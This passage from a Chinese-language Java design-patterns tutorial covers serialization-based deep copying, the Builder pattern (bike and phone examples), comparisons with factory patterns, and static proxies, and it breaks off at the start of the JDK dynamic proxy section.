<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CitationTest1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Citation c1 = <span class="keyword">new</span> Citation();</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;西安&quot;</span>);</span><br><span class="line">        c1.setStu(stu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建对象输出流对象</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\Users\\Think\\Desktop\\b.txt&quot;</span>));</span><br><span class="line">        <span class="comment">//将c1对象写出到文件中</span></span><br><span class="line">        oos.writeObject(c1);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建对象出入流对象</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;C:\\Users\\Think\\Desktop\\b.txt&quot;</span>));</span><br><span class="line">        <span class="comment">//读取对象</span></span><br><span class="line">        Citation c2 = (Citation) ois.readObject();</span><br><span class="line">        <span class="comment">//获取c2奖状所属学生对象</span></span><br><span class="line">        Student stu1 = c2.getStu();</span><br><span class="line">        stu1.setName(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断stu对象和stu1对象是否是同一个对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;stu和stu1是同一个对象？&quot;</span> + (stu == stu1));</span><br><span class="line"></span><br><span class="line">        c1.show();</span><br><span class="line">        c2.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果为：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-42-20.png" style="zoom:80%;" />

<blockquote>
<p>注意：Citation类和Student类<strong>必须实现Serializable接口</strong>，否则会抛NotSerializableException异常。</p>
</blockquote>
<h4 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h4><p><strong>概述</strong></p>
<p>将一个复杂对象的构建与表示分离，使得同样的构建过程可以创建不同的表示。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-42-27.png" style="zoom:60%;" />

<ul>
<li>分离了部件的构造(由Builder来负责)和装配(由Director负责)。 从而可以构造出复杂的对象。这个模式适用于：某个对象的构建过程复杂的情况。</li>
<li>由于实现了构建和装配的解耦。不同的构建器，相同的装配，也可以做出不同的对象；相同的构建器，不同的装配顺序也可以做出不同的对象。也就是实现了构建算法、装配算法的解耦，实现了更好的复用。</li>
<li>建造者模式可以将部件和其组装过程分开，一步一步创建一个复杂的对象。用户只需要指定复杂对象的类型就可以得到该对象，而无须知道其内部的具体构造细节。</li>
</ul>
<p><strong>结构</strong></p>
<p>建造者（Builder）模式包含如下角色：</p>
<ul>
<li><p>抽象建造者类（Builder）：这个接口规定要实现复杂对象的那些部分的创建，并不涉及具体的部件对象的创建。 </p>
</li>
<li><p>具体建造者类（ConcreteBuilder）：实现 Builder 接口，完成复杂产品的各个部件的具体创建方法。在构造过程完成后，提供产品的实例。 </p>
</li>
<li><p>产品类（Product）：要创建的复杂对象。</p>
</li>
<li><p>指挥者类（Director）：调用具体建造者来创建复杂对象的各个部分，在指导者中不涉及具体产品的信息，只负责保证对象各部分完整创建或按某种顺序创建。 </p>
</li>
</ul>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-42-31.png" style="zoom:80%;" />

<p><strong>实例</strong></p>
<p>创建共享单车：</p>
<p>生产自行车是一个复杂的过程，它包含了车架，车座等组件的生产。而车架又有碳纤维，铝合金等材质的，车座有橡胶，真皮等材质。对于自行车的生产就可以使用建造者模式。</p>
<p>这里Bike是产品，包含车架，车座等组件；Builder是抽象建造者，MobikeBuilder和OfoBuilder是具体的建造者；Director是指挥者。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-42-38.png" style="zoom:80%;" />

<p>具体的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自行车类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bike</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String frame;</span><br><span class="line">    <span class="keyword">private</span> String seat;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFrame</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> frame;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFrame</span><span class="params">(String frame)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.frame = frame;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSeat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> seat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSeat</span><span class="params">(String seat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.seat = seat;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象 builder 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Bike mBike = <span class="keyword">new</span> Bike();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">buildFrame</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">buildSeat</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Bike <span class="title">createBike</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//摩拜单车Builder类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MobikeBuilder</span> <span class="keyword">extends</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buildFrame</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mBike.setFrame(<span class="string">&quot;铝合金车架&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buildSeat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mBike.setSeat(<span class="string">&quot;真皮车座&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Bike <span class="title">createBike</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBike;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ofo单车Builder类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OfoBuilder</span> <span class="keyword">extends</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buildFrame</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mBike.setFrame(<span class="string">&quot;碳纤维车架&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buildSeat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mBike.setSeat(<span class="string">&quot;橡胶车座&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Bike <span class="title">createBike</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBike;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指挥者类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Director</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Builder mBuilder;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Director</span><span class="params">(Builder builder)</span> </span>&#123;</span><br><span class="line">        mBuilder = builder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Bike <span class="title">construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mBuilder.buildFrame();</span><br><span class="line">        mBuilder.buildSeat();</span><br><span class="line">        <span class="keyword">return</span> mBuilder.createBike();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        showBike(<span class="keyword">new</span> OfoBuilder());</span><br><span class="line">        showBike(<span class="keyword">new</span> MobikeBuilder());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showBike</span><span class="params">(Builder builder)</span> </span>&#123;</span><br><span class="line">        Director director = <span class="keyword">new</span> Director(builder);</span><br><span class="line">        Bike bike = director.construct();</span><br><span class="line">        System.out.println(bike.getFrame());</span><br><span class="line">        System.out.println(bike.getSeat());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<p>上面示例是 Builder模式的常规用法，指挥者类 <strong>Director</strong> 在建造者模式中具有很重要的作用，它用于指导具体构建者如何构建产品，<strong>控制调用先后次序，并向调用者返回完整的产品类，</strong>但是有些情况下需要简化系统结构，可以把指挥者类和抽象建造者进行结合</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抽象 builder 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Bike mBike = <span class="keyword">new</span> Bike();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">buildFrame</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">buildSeat</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Bike <span class="title">createBike</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Bike <span class="title">construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.buildFrame();</span><br><span class="line">        <span class="keyword">this</span>.BuildSeat();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.createBike();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<p>这样做确实简化了系统结构，但同时也加重了抽象建造者类的职责，也不是太符合单一职责原则，如果<code>construct() </code>过于复杂，建议还是封装到 <code>Director </code>中。</p>
<p><strong>优缺点</strong></p>
<ul>
<li><p>优点：</p>
<ul>
<li>建造者模式的封装性很好。使用建造者模式可以有效的封装变化，在使用建造者模式的场景中，一般产品类和建造者类是比较稳定的，因此，将主要的业务逻辑封装在指挥者类中对整体而言可以取得比较好的稳定性。</li>
<li>在建造者模式中，客户端不必知道产品内部组成的细节，将产品本身与产品的创建过程解耦，使得相同的创建过程可以创建不同的产品对象。</li>
<li>可以更加精细地控制产品的创建过程 。将复杂产品的创建步骤分解在不同的方法中，使得创建过程更加清晰，也更方便使用程序来控制创建过程。</li>
<li>建造者模式很容易进行扩展。如果有新的需求，通过实现一个新的建造者类就可以完成，基本上不用修改之前已经测试通过的代码，因此也就不会对原有功能引入风险。符合开闭原则。</li>
</ul>
</li>
<li><p>缺点：</p>
<ul>
<li>造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，则不适合使用建造者模式，因此其使用范围受到一定的限制。</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<p>建造者（Builder）模式<strong>创建的是复杂对象</strong>，其产品的<strong>各个部分经常变化</strong>，但将它们<strong>组合在一起的算法却相对稳定</strong>，所以它通常在以下场合使用。</p>
<ul>
<li>创建的对象较复杂，由多个部件构成，各部件面临着复杂的变化，但构件间的建造顺序是稳定的。</li>
<li>创建复杂对象的算法独立于该对象的组成部分以及它们的装配方式，即产品的构建过程和最终的表示是独立的。</li>
</ul>
<p><strong>模式扩展</strong></p>
<p>建造者模式除了上面的用途外，在开发中还有一个常用的使用方式，就是当一个类构造器需要传入很多参数时，如果创建这个类的实例，代码可读性会非常差，而且很容易引入错误，此时就可以利用建造者模式进行重构。</p>
<p>重构前代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String cpu;</span><br><span class="line">    <span class="keyword">private</span> String screen;</span><br><span class="line">    <span class="keyword">private</span> String memory;</span><br><span class="line">    <span class="keyword">private</span> String mainboard;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(String cpu, String screen, String memory, String mainboard)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cpu = cpu;</span><br><span class="line">        <span class="keyword">this</span>.screen = screen;</span><br><span class="line">        <span class="keyword">this</span>.memory = memory;</span><br><span class="line">        <span class="keyword">this</span>.mainboard = mainboard;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCpu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cpu;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCpu</span><span class="params">(String cpu)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cpu = cpu;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getScreen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> screen;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScreen</span><span class="params">(String screen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.screen = screen;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMemory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> memory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMemory</span><span class="params">(String memory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.memory = memory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMainboard</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mainboard;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMainboard</span><span class="params">(String mainboard)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.mainboard = mainboard;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Phone&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cpu=&#x27;&quot;</span> + cpu + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, screen=&#x27;&quot;</span> + screen + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, memory=&#x27;&quot;</span> + memory + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, mainboard=&#x27;&quot;</span> + mainboard + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//构建Phone对象</span></span><br><span class="line">        Phone phone = <span class="keyword">new</span> Phone(<span class="string">&quot;intel&quot;</span>,<span class="string">&quot;三星屏幕&quot;</span>,<span class="string">&quot;金士顿&quot;</span>,<span class="string">&quot;华硕&quot;</span>);</span><br><span class="line">        System.out.println(phone);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面在客户端代码中构建Phone对象，传递了四个参数，如果参数更多呢？代码的可读性及使用的成本就是比较高。</p>
<p>重构后代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String cpu;</span><br><span class="line">    <span class="keyword">private</span> String screen;</span><br><span class="line">    <span class="keyword">private</span> String memory;</span><br><span class="line">    <span class="keyword">private</span> String mainboard;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Phone</span><span class="params">(Builder builder)</span> </span>&#123;</span><br><span class="line">        cpu = builder.cpu;</span><br><span class="line">        screen = builder.screen;</span><br><span class="line">        memory = builder.memory;</span><br><span class="line">        mainboard = builder.mainboard;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String cpu;</span><br><span class="line">        <span class="keyword">private</span> String screen;</span><br><span class="line">        <span class="keyword">private</span> String memory;</span><br><span class="line">        <span class="keyword">private</span> String mainboard;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Builder</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Builder <span class="title">cpu</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">            cpu = val;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Builder <span class="title">screen</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">            screen = val;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Builder <span class="title">memory</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">            memory = val;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Builder <span class="title">mainboard</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">            mainboard = val;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Phone <span class="title">build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Phone(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Phone&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cpu=&#x27;&quot;</span> + cpu + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, screen=&#x27;&quot;</span> + screen + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, memory=&#x27;&quot;</span> + memory + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, mainboard=&#x27;&quot;</span> + mainboard + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Phone phone = <span class="keyword">new</span> Phone.Builder()</span><br><span class="line">                .cpu(<span class="string">&quot;intel&quot;</span>)</span><br><span class="line">                .mainboard(<span class="string">&quot;华硕&quot;</span>)</span><br><span class="line">                .memory(<span class="string">&quot;金士顿&quot;</span>)</span><br><span class="line">                .screen(<span class="string">&quot;三星&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">        System.out.println(phone);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重构后的代码在使用起来更方便，某种程度上也可以提高开发效率。从软件设计上，对程序员的要求比较高。</p>
<h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><p><strong>工厂方法模式VS建造者模式</strong></p>
<ul>
<li>工厂方法模式注重的是<strong>整体对象的创建</strong>方式；</li>
<li>而建造者模式注重的是<strong>部件构建的过程</strong>，意在通过<strong>一步一步地精确构造创建出一个复杂的对象</strong>。</li>
</ul>
<p>我们举个简单例子来说明两者的差异，如要制造一个超人，如果使用工厂方法模式，直接产生出来的就是一个力大无穷、能够飞翔、内裤外穿的超人；而如果使用建造者模式，则需要组装手、头、脚、躯干等部分，然后再把内裤外穿，于是一个超人就诞生了。</p>
<p><strong>抽象工厂模式VS建造者模式</strong></p>
<ul>
<li>抽象工厂模式<strong>实现对产品家族的创建，一个产品家族是这样的一系列产品</strong>：具有不同分类维度的产品组合，采用抽象工厂模式则是不需要关心构建过程，只关心什么产品由什么工厂生产即可。</li>
<li>建造者模式则是要求<strong>按照指定的蓝图建造产品</strong>，它的主要目的是通过组装零配件而产生一个新产品。</li>
</ul>
<p>如果将抽象工厂模式看成汽车配件生产工厂，生产一个产品族的产品，那么建造者模式就是一个汽车组装工厂，通过对部件的组装可以返回一辆完整的汽车。</p>
<h3 id="结构型模式"><a href="#结构型模式" class="headerlink" title="结构型模式"></a>结构型模式</h3><p>结构型模式描述如何将类或对象按某种布局组成更大的结构。它分为<strong>类结构型模式</strong>和<strong>对象结构型模式</strong>，<strong>前者采用继承机制来组织接口和类，后者釆用组合或聚合来组合对象。</strong></p>
<p>由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象结构型模式比类结构型模式具有更大的灵活性。</p>
<p>结构型模式分为以下 7 种：</p>
<ul>
<li>代理模式</li>
<li>适配器模式</li>
<li>装饰者模式</li>
<li>桥接模式</li>
<li>外观模式</li>
<li>组合模式</li>
<li>享元模式</li>
</ul>
<h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><p><strong>概述</strong></p>
<p>由于某些原因需要给某对象提供一个代理以控制对该对象的访问。这时，访问对象不适合或者不能直接引用目标对象，代理对象作为访问对象和目标对象之间的中介。</p>
<p>Java中的代理按照代理类生成时机不同又分为静态代理和动态代理。静态代理代理类在<strong>编译期</strong>就生成，而动态代理代理类则是在<strong>Java运行时</strong>动态生成。动态代理又有JDK代理和CGLib代理两种。</p>
<p><strong>结构</strong></p>
<p>代理（Proxy）模式分为三种角色：</p>
<ul>
<li>抽象主题（Subject）类： 通过接口或抽象类声明真实主题和代理对象实现的业务方法。</li>
<li>真实主题（Real Subject）类： 实现了抽象主题中的具体业务，是代理对象所代表的真实对象，是最终要引用的对象。</li>
<li>代理（Proxy）类 ： 提供了与真实主题相同的接口，其内部含有对真实主题的引用，它可以访问、控制或扩展真实主题的功能。</li>
</ul>
<h5 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h5><p>我们通过案例来感受一下静态代理。</p>
<p>【例】火车站卖票</p>
<p>如果要买火车票的话，需要去火车站买票，坐车到火车站，排队等一系列的操作，显然比较麻烦。而火车站在多个地方都有代售点，我们去代售点买票就方便很多了。这个例子其实就是典型的代理模式，<strong>火车站是目标对象，代售点是代理对象</strong>。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-42-48.png" style="zoom:80%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//卖票接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SellTickets</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//火车站  火车站具有卖票功能，所以需要实现SellTickets接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainStation</span> <span class="keyword">implements</span> <span class="title">SellTickets</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;火车站卖票&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代售点</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyPoint</span> <span class="keyword">implements</span> <span class="title">SellTickets</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TrainStation station = <span class="keyword">new</span> TrainStation();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;代理点收取一些服务费用&quot;</span>);</span><br><span class="line">        station.sell();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ProxyPoint pp = <span class="keyword">new</span> ProxyPoint();</span><br><span class="line">        pp.sell();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面代码中可以看出测试类直接访问的是ProxyPoint类对象，也就是说<strong>ProxyPoint作为访问对象和目标对象的中介</strong>。同时也对sell方法进行了增强（代理点收取一些服务费用）。</p>
<h5 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h5><p>接下来我们使用动态代理实现上面案例，先说说JDK提供的动态代理。Java中提供了一个动态代理类Proxy，<strong>Proxy并不是我们上述所说的代理对象的类，而是提供了一个创建代理对象的静态方法（newProxyInstance方法）来==获取==代理对象</strong>。</p>
<p>代码如下：</p>
